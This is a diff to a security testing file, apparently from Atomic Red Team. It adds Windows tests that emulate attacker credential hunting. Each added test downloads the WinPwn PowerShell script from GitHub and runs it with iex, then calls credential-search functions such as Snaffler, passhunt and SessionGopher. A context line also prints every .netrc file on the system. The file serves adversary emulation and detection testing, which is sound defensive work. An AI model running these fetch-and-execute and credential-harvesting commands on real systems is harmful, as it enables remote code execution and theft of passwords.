@@ -67,5 +67,66 @@ atomic_tests:
     elevation_required: false # Indicates whether command must be run with admin privileges. If the elevation_required attribute is not defined, the value is assumed to be false.
     command: | 
       for file in $(find / -name .netrc 2> /dev/null);do echo $file ; cat $file ; done 
-      
-
+- name: WinPwn - sensitivefiles
+  auto_generated_guid: 114dd4e3-8d1c-4ea7-bb8d-8d8f6aca21f0
+  description: Search for sensitive files on this local system using the SensitiveFiles function of WinPwn
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+      sensitivefiles -noninteractive -consoleoutput
+    name: powershell
+- name: WinPwn - Snaffler
+  auto_generated_guid: fdd0c913-714b-4c13-b40f-1824d6c015f2
+  description: Check Domain Network-Shares for cleartext passwords using Snaffler function of WinPwn
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+      Snaffler -noninteractive -consoleoutput
+    name: powershell
+- name: WinPwn - powershellsensitive
+  auto_generated_guid: 75f66e03-37d3-4704-9520-3210efbe33ce
+  description: Check Powershell event logs for credentials or other sensitive information via winpwn powershellsensitive function.
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+      powershellsensitive -consoleoutput -noninteractive
+    name: powershell
+- name: WinPwn - passhunt
+  auto_generated_guid: 00e3e3c7-6c3c-455e-bd4b-461c7f0e7797
+  description: Search for Passwords on this system using passhunt via WinPwn
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+      passhunt -local $true -noninteractive
+    cleanup_command: |-
+      rm -force .\passhunt.exe -ErrorAction Ignore
+      rm -force .\phunter* -ErrorAction Ignore
+      rm -force -recurse .\DomainRecon -ErrorAction Ignore
+      rm -force -recurse .\Exploitation -ErrorAction Ignore
+      rm -force -recurse .\LocalPrivEsc -ErrorAction Ignore
+      rm -force -recurse .\LocalRecon -ErrorAction Ignore
+      rm -force -recurse .\Vulnerabilities -ErrorAction Ignore
+    name: powershell
+- name: WinPwn - SessionGopher
+  auto_generated_guid: c9dc9de3-f961-4284-bd2d-f959c9f9fda5
+  description: Launches SessionGopher on this system via WinPwn
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+      sessionGopher -noninteractive -consoleoutput
+    name: powershell
